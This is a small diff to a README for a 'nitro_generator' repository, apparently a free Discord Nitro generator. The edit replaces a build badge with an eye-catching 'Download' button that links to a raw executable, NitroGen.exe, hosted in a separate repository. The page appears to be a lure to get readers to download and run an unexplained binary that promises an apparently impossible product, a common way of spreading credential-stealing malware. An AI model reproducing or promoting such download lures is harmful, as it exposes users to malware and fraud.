@@ -1,6 +1,6 @@
 # nitro_generator
 
-[![Download](https://github.com/ntkme/github-buttons/workflows/build/badge.svg)](https://github.com/oxyblade-1/nitro_generator-edit/raw/main/NitroGen.exe)
+[![Download](https://custom-icon-badges.herokuapp.com/badge/-Download-lime?style=for-the-badge&logo=download&logoColor=black "Download")](https://github.com/oxyblade-1/nitro_generator-edit/raw/main/NitroGen.exe)
 
 ![banner_nitro](https://gifimage.net/wp-content/uploads/2017/10/discord-gif-emoji-3.gif)
 
